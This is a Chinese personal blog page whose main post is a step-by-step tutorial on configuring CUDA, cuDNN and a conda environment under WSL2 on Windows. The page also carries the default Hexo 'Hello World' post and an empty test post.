<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Ron&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="old but lowlevel OIer and a young CTFer">
<meta property="og:type" content="website">
<meta property="og:title" content="Ron&#39;s Blog">
<meta property="og:url" content="https://lucxer.tk/index.html">
<meta property="og:site_name" content="Ron&#39;s Blog">
<meta property="og:description" content="old but lowlevel OIer and a young CTFer">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Ron">
<meta property="article:tag" content="CTF, OI, Algorithm, coder">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Ron's Blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Ron&#39;s Blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">淡泊明志, 宁静致远</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://lucxer.tk"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-test" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/29/test/" class="article-date">
  <time class="dt-published" datetime="2020-12-29T13:47:06.000Z" itemprop="datePublished">2020-12-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/29/test/">test</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="https://lucxer.tk/2020/12/29/test/" data-id="ckja3vkq6000t14ln63o1g68l" data-title="test" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/29/hello-world/" class="article-date">
  <time class="dt-published" datetime="2020-12-29T13:35:06.505Z" itemprop="datePublished">2020-12-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/29/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://lucxer.tk/2020/12/29/hello-world/" data-id="ckja3vkq4000r14lnbe8k763o" data-title="Hello World" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-WSL+CUDA" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/29/WSL+CUDA/" class="article-date">
  <time class="dt-published" datetime="2020-12-29T10:11:12.000Z" itemprop="datePublished">2020-12-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/29/WSL+CUDA/">Windows 下利用 WSL2 配置 CUDA和pyCUDA</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="0x01-写在前面"><a href="#0x01-写在前面" class="headerlink" title="0x01 写在前面"></a>0x01 写在前面</h1><p>现在很多项目都是基于 Linux 开发的，但是平常使用还是 Windows 香。（主要是我物理机是 Windows 我又不想装成 Linux</p>
<p>而有时候 Windows 真的非常不利于开发者，他的各自环境太难配置了，这时候是 Linux 香。</p>
<p>但是 <code>WSL</code> 才是真的香，启动快，共享空间，现在还能共享 GPU 了。。。。。</p>
<p>而我本次鉴于某些原因，失去了千辛万苦配置好 Windows 上能跑的 <code>pycuda</code> 的环境，重配又没有成功。好契机。</p>
<p>不说这么多，我先冲了。希望本教程能帮到你。</p>
<br>

<h1 id="0x02-确保-WSL2"><a href="#0x02-确保-WSL2" class="headerlink" title="0x02 确保 WSL2"></a>0x02 确保 WSL2</h1><h2 id="2-1-检查现有的WSL版本"><a href="#2-1-检查现有的WSL版本" class="headerlink" title="2.1 检查现有的WSL版本"></a>2.1 检查现有的WSL版本</h2><p>以管理员身份运行 <code>cmd</code> ，并输入下面的命令，检查准备安装 <code>CUDA</code> 的 <code>Linux </code>发行版本的 <code>WSL</code> 版本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --list -v</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229161044721.png" alt="检查WSL版本"></p>
<p>如上图，笔者的两个都是 <code>WSL1</code> ，居然都是 <code>VERSION = 1</code>。 </p>
<blockquote>
<p>幸好笔者在搭建的时候遇到两次没有放弃。重新查阅了别人的博客，这才检查了自己的 <code>WSL</code> 的版本，才发现居然都是版本1，尽管在搭建之前已经执行了命令 <code>wsl --set-default-version 2</code> 设置默认版本为 <code>WSL2</code> 。但是居然安装的还是1，或许是笔者没有在应用商店安装而是使用了，<code>lxrunoffline</code> 工具。（参阅上一篇博客）。导致后续验证 <code>CUDA</code> 是否安装成功时，一直报错运行的 <code>CUDA</code> 版本与显卡驱动不匹配，笔者就轻信了，认为是 <code>CUDA11</code> 的锅，删除了 <code>WSL</code> 重装了一次，从 <code>CUDA11</code> 降到了 <code>CUDA10.2</code> ，然而还是一样的错误。</p>
<p>不过幸好这里找到了是这个原因，在转化升级 <code>WSL</code> 到 <code>WSL2</code> 之后，这个问题就不存在了。安装就一瞬完成了。</p>
</blockquote>
<br>

<h2 id="2-2-升级现有的-WSL-到-WSL2"><a href="#2-2-升级现有的-WSL-到-WSL2" class="headerlink" title="2.2 升级现有的 WSL 到 WSL2"></a>2.2 升级现有的 WSL 到 WSL2</h2><p>首先使用下面的命令，查看查看有哪些 <code>WSL</code> 。在 <code>cmd</code> 中键入下面的命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl -l</span><br></pre></td></tr></table></figure>
<p>然后将想要升级的名字记住，设置其版本为 <code>WSL2</code> ，在 <code>cmd</code> 中键入下面的命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># wsl --set-version &lt;WSL名称&gt; 2 </span><br><span class="line">wsl --set-version Ubuntu18CUDA 2</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229161431055.png" alt="升级WSL"></p>
<p>这个过程取决于设备，可能时间比较久（笔者花了7分钟左右。）</p>
<p>待其完成后，就好啦。</p>
<p><img src="https://raw.githubusercontent.com/LCX666/picgo-blog/master/img/image-20201229163244987.png" alt="转换完毕"></p>
<p>再查看，转换的版本就对了</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229163309999.png" alt="再次查看"></p>
<br>

<h1 id="0x03-安装-cuda"><a href="#0x03-安装-cuda" class="headerlink" title="0x03 安装 cuda"></a>0x03 安装 cuda</h1><h2 id="3-1-换源"><a href="#3-1-换源" class="headerlink" title="3.1 换源"></a>3.1 换源</h2><p>由于总所周知的原因，官方源往往很慢，于是推荐换个源先</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 下面所有都是非 root 自己添加 sudo</span><br><span class="line"># 首先备份源列表</span><br><span class="line">cp &#x2F;etc&#x2F;apt&#x2F;sources.list &#x2F;etc&#x2F;apt&#x2F;sources.list_backup </span><br><span class="line"></span><br><span class="line"># 打开sources.list文件</span><br><span class="line">vim &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br><span class="line"></span><br><span class="line"># 在最前面添加阿里源</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
<p>最好注释掉其他的，默认的，后面的源，不然会多一些不可达的不必要的error。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229143627984.png" alt="换源"></p>
<p>然后刷新一下源，一定要刷新一下源。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get upgrade</span><br><span class="line">apt-get install build-essential</span><br></pre></td></tr></table></figure>
<p>耗时有点久。。。。。</p>
<br>

<h2 id="3-2-安装驱动"><a href="#3-2-安装驱动" class="headerlink" title="3.2 安装驱动"></a>3.2 安装驱动</h2><p>这一部分的官方教程在这里：<a target="_blank" rel="noopener" href="https://docs.nvidia.com/cuda/wsl-user-guide/index.html">cuda for wsl</a></p>
<p><strong>在 Windows 上进行显卡驱动的安装。</strong></p>
<p>下载对应的显卡型号的驱动：<a target="_blank" rel="noopener" href="https://developer.nvidia.com/cuda/wsl/download">地址</a>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228232321036.png" alt="下载驱动"></p>
<p>需要先注册一下 然后才能进行下载。</p>
<p>然后双击运行。默认目录就好。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228233000120.png" alt="安装驱动-1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228233547776.png" alt="安装驱动-2"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228233634638.png" alt="安装驱动-3"></p>
<p><img src="C:\Users\chegn\AppData\Roaming\Typora\typora-user-images\image-20201228233640692.png" alt="安装驱动-4"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228233649063.png" alt="安装驱动-5"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228234149312.png" alt="安装驱动-6"></p>
<br>

<h2 id="3-3-安装-cuda-toolkit"><a href="#3-3-安装-cuda-toolkit" class="headerlink" title="3.3. 安装 cuda toolkit"></a>3.3. 安装 cuda toolkit</h2><h3 id="3-3-1-安装"><a href="#3-3-1-安装" class="headerlink" title="3.3.1 安装"></a>3.3.1 安装</h3><p>输入以下命令进行，以安装 cuda toolkit。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-key adv --fetch-keys http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub</span><br><span class="line"></span><br><span class="line">sh -c <span class="string">&#x27;echo &quot;deb http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64 /&quot; &gt; /etc/apt/sources.list.d/cuda.list&#x27;</span></span><br><span class="line"></span><br><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229134330940.png" alt="命令截图1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229135542045.png" alt="命令截图2"></p>
<br>

<p>然后是 install CUDA，笔者这里是选择的 10.2 版本。</p>
<blockquote>
<p>CUDA Device Query (Runtime API) version (CUDART static linking)  cudaGetDeviceCount returned 35 -&gt; CUDA driver version is insufficient for CUDA runtime version Result = FAIL</p>
</blockquote>
<p>援引官方的话，读者也可以自己选择自己想要的版本。</p>
<blockquote>
<p>Do not choose the cuda, cuda-11-0, or cuda-drivers meta-packages under WSL 2 since these packages will result in an attempt to install the Linux NVIDIA driver under WSL 2.</p>
<p>意思是，不要在命令中直接选择 <code>cuda</code> 、 <code>cuda-11-0</code> 这种名字，在 WSL 中，必须要用 <code>cuda-toolkit-10-2</code> 这种格式的名字。</p>
</blockquote>
<p><strong>下面命令2选1。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 笔者安装 10.2</span><br><span class="line">apt-get install -y cuda-toolkit-10-2</span><br><span class="line"></span><br><span class="line"># 官方叫安装 11</span><br><span class="line">apt-get install -y cuda-toolkit-11-0</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里还错怪了一波 11 版本，读者大可以选择 11。</p>
</blockquote>
<p>时间有点久  请耐心等待，要是没换源估计更慢了，现在切回去换源还来得及。</p>
<h3 id="3-3-2-debug"><a href="#3-3-2-debug" class="headerlink" title="3.3.2 debug"></a>3.3.2 debug</h3><p>完事之后，你有可能可能会看到这个 <code>error</code>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229141223257.png" alt="error-1"></p>
<p><code>apt-get</code> 已经用过了，那就加上 <code>--fix-missing</code> 吧。但是笔者这边实测只是跳过了， <code>error</code> 并没解决。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y cuda-toolkit-10-2 --fix-missing</span><br></pre></td></tr></table></figure>
<p>然后发现，<strong>这个多半是源更换了，没有刷新的缘故</strong>。回到换源的地方，刷新一下源再执行下面的命令就可以了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y cuda-toolkit-10-2</span><br></pre></td></tr></table></figure>


<h3 id="3-3-3-安装完成"><a href="#3-3-3-安装完成" class="headerlink" title="3.3.3 安装完成"></a>3.3.3 安装完成</h3><p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229150828428.png" alt="安装完成"></p>
<p>按照<a target="_blank" rel="noopener" href="https://docs.nvidia.com/cuda/wsl-user-guide/index.html#unique_2118253331">官方的说法</a>似乎就可以了？</p>
<blockquote>
<p>Running CUDA Applications<br>Just run your CUDA app as you would run it under Linux! Once the driver is installed there is nothing more to do to run existing CUDA applications that were built on Linux.</p>
<p>A snippet of running the BlackScholes Linux application from the CUDA samples is shown below.</p>
<p>Build the CUDA samples available under /usr/local/cuda/samples from your installation of the CUDA Toolkit in the previous section. The BlackScholes application is located under /usr/local/cuda/samples/4_Finance/BlackScholes. Alternatively, you can transfer a binary built on Linux to WSL 2!</p>
</blockquote>
<br>

<h2 id="3-4-检查安装"><a href="#3-4-检查安装" class="headerlink" title="3.4 检查安装"></a>3.4 检查安装</h2><p>在 <code>/usr/local</code> 下可以看到刚刚的安装。而且 <code>CUDA</code> 的版本是 <code>10.2</code> ，所以 <code>cuDNN</code> 也下载 <code>CUDA10.2</code> 对应的版本。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229151149679.png" alt="查看cuda"></p>
<p>然后我们依然安装 cudnn，<a target="_blank" rel="noopener" href="https://docs.nvidia.com/deeplearning/sdk/cudnn-install/index.html#install-linux">官方教程</a>。 </p>
<h3 id="3-4-1-Windows-查看-WSL-的文件"><a href="#3-4-1-Windows-查看-WSL-的文件" class="headerlink" title="3.4.1 Windows 查看 WSL 的文件"></a>3.4.1 Windows 查看 WSL 的文件</h3><p>由于 <code>WSL</code> 和 Windows 的文件系统是通用的，因此，我们可以通过 Windows 下载了拷贝进去。</p>
<blockquote>
<p>Windows 直接在文件夹左侧就能看到对应的 Ubuntu WSL</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229175715371.png" alt="查看WSL"></p>
<h3 id="3-4-2-WSL-查看-Windows-文件"><a href="#3-4-2-WSL-查看-Windows-文件" class="headerlink" title="3.4.2 WSL 查看 Windows 文件"></a>3.4.2 WSL 查看 Windows 文件</h3><blockquote>
<p><code>WSL</code> 看 Windows 的子系统则可以在文件系统中的 <code>/mnt</code> 下面。c、d、e就是对应的盘。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229151541069.png" alt="查看Windows的系统盘"></p>
<br>

<h1 id="0x04-安装-cuDNN"><a href="#0x04-安装-cuDNN" class="headerlink" title="0x04 安装 cuDNN"></a>0x04 安装 cuDNN</h1><h2 id="4-1-下载-cuDNN"><a href="#4-1-下载-cuDNN" class="headerlink" title="4.1 下载 cuDNN"></a>4.1 下载 cuDNN</h2><p>下载 cuDNN：<a target="_blank" rel="noopener" href="https://developer.nvidia.com/cudnn">地址</a>。</p>
<p>选择 Linux 的对应版本的 tar.gz，笔者这里是 10.2 。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229151328570.png" alt="下载对应的cuDNN"></p>
<br>

<h2 id="4-2-移动文件"><a href="#4-2-移动文件" class="headerlink" title="4.2 移动文件"></a>4.2 移动文件</h2><p>下载完毕后，就是通过文件的本质共享，将其移动到子系统的某个位置去。</p>
<p>笔者下载下来是这个名字 <code>cudnn-10.2-linux-x64-v8.0.5.39.solitairetheme8</code> 笔者重命名了 <code>cudnn-10.2-linux-x64-v8.0.5.39.tar.gz</code></p>
<p>然后运行下面的命令进行拷贝和解压。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 新建目录</span></span><br><span class="line">mkdir /usr/local/temp</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 拷贝文件</span></span><br><span class="line">cp cudnn-10.2-linux-x64-v8.0.5.39.tar.gz /usr/local/temp</span><br></pre></td></tr></table></figure>
<p>然后在temp文件夹对其进行解压，注意更换对应的文件名哈。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf cudnn-10.2-linux-x64-v8.0.5.39.tar.gz</span><br></pre></td></tr></table></figure>
<p>解压完毕后。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229152202456.png" alt="解压完毕"></p>
<br>

<h2 id="4-3-移动到-CUDA-目录"><a href="#4-3-移动到-CUDA-目录" class="headerlink" title="4.3 移动到 CUDA 目录"></a>4.3 移动到 CUDA 目录</h2><p>执行下面的三个命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp cuda/include/cudnn*.h /usr/local/cuda/include</span><br><span class="line">cp cuda/lib64/libcudnn* /usr/local/cuda/lib64</span><br><span class="line">chmod a+r /usr/local/cuda/include/cudnn*.h /usr/local/cuda/lib64/libcudnn*</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229152357564.png" alt="拷贝cuDNN"></p>
<p>由于文件有点多，第二个复制耗时有点长。然后 <code>temp</code> 文件夹也可以删除了。</p>
<p>于是就安装完成了。</p>
<br>

<h1 id="0x05-测试安装"><a href="#0x05-测试安装" class="headerlink" title="0x05 测试安装"></a>0x05 测试安装</h1><h2 id="5-1-设置环境变量"><a href="#5-1-设置环境变量" class="headerlink" title="5.1 设置环境变量"></a>5.1 设置环境变量</h2><p>设置一个环境变量，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export CUDA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;cuda</span><br><span class="line">export PATH&#x3D;$PATH:$CUDA_HOME&#x2F;bin</span><br><span class="line">export LD_LIBRARY_PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;cuda-10.2&#x2F;lib64$&#123;LD_LIBRARY_PATH:+:$&#123;LD_LIBRARY_PATH&#125;&#125; # 前两个必须要修改什么，第三个则需要根据版本的不同，修改路径中的10.2</span><br></pre></td></tr></table></figure>
<br>

<h2 id="5-2-编译-demo"><a href="#5-2-编译-demo" class="headerlink" title="5.2 编译 demo"></a>5.2 编译 demo</h2><p>移步到 demo 中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;cuda&#x2F;samples&#x2F;1_Utilities&#x2F;deviceQuery </span><br></pre></td></tr></table></figure>
<p>有 <code>makefile</code> ，我们直接 <code>make</code> 编译一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229152927912.png" alt="编译测试文件"></p>
<br>

<h2 id="5-3-运行-demo"><a href="#5-3-运行-demo" class="headerlink" title="5.3 运行 demo"></a>5.3 运行 demo</h2><p>然后运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;deviceQuery</span><br></pre></td></tr></table></figure>
<p>正常情况下，会看到下面的样子。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229163716541.png" alt="deviceQuery-1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229163733405.png" alt="deviceQuery-2"></p>
<br>

<h2 id="5-4-debug"><a href="#5-4-debug" class="headerlink" title="5.4 debug"></a>5.4 debug</h2><p>有可能会遇到下面的错误，错版本和驱动不兼容。。。。</p>
<blockquote>
<p>CUDA Device Query (Runtime API) version (CUDART static linking)  cudaGetDeviceCount returned 35 -&gt; CUDA driver version is insufficient for CUDA runtime version Result = FAIL</p>
</blockquote>
<p>但是在解决了 <code>WSL</code> 到 <code>WSL2</code> 的问题后就一瞬成功了。可能就是因为笔者使用的工具，所以默认的 <code>WSL2</code> 的选项没有生效，于是安装的都是 <code>WSL1</code> 的发行版，于是一直不成功。升级到 <code>WSL2</code> 后，再运行就一瞬成功了。</p>
<p><strong>如果读者也遇到了此问题，不妨返回开头检查自己是否是 <code>WSL2</code> 。</strong></p>
<br>

<h1 id="0x06-安装-conda"><a href="#0x06-安装-conda" class="headerlink" title="0x06 安装 conda"></a>0x06 安装 conda</h1><h2 id="6-1-安装-conda"><a href="#6-1-安装-conda" class="headerlink" title="6.1 安装 conda"></a>6.1 安装 conda</h2><p>安装一个 mini conde，按照提示一路默认安装装就好。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;repo.anaconda.com&#x2F;miniconda&#x2F;Miniconda3-latest-Linux-x86_64.sh </span><br><span class="line">bash Miniconda3-latest-Linux-x86_64.sh </span><br></pre></td></tr></table></figure>
<p><strong>安装完毕后需要将此终端关闭，然后新开一个进入才会生效。</strong></p>
<br>

<h2 id="6-2-新建虚拟环境"><a href="#6-2-新建虚拟环境" class="headerlink" title="6.2 新建虚拟环境"></a>6.2 新建虚拟环境</h2><blockquote>
<p>虚拟环境有诸多好处，以下是笔者觉得的好处：</p>
<p>1、各个项目的需求和依赖有所不同，不同的项目可能对环境有冲突，虚拟环境就可以各自独立，互不影响。</p>
<p>2、各个项目独立，使得各自的项目环境独立，在到处依赖的时候不会导出更多的无关的依赖。</p>
<p>3、万一搞废了，从新整一个也不至于全部都废弃了。</p>
<p>等等。</p>
</blockquote>
<p>创建一个虚拟环境，这里我们选择 3.6。（就是随便选了一个，貌似 Linux 默认的 python 就是3.6</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda create --name py36CUDA python&#x3D;3.6</span><br></pre></td></tr></table></figure>
<p>建立完毕后，我们如何使用，这里也说的很清楚了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229012149782.png" alt="使用虚拟环境"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 进入虚拟环境</span><br><span class="line">conda activate py36CUDA # 虚拟环境的名字</span><br><span class="line"></span><br><span class="line"># 退出虚拟环境</span><br><span class="line">conda deactivate</span><br></pre></td></tr></table></figure>
<br>

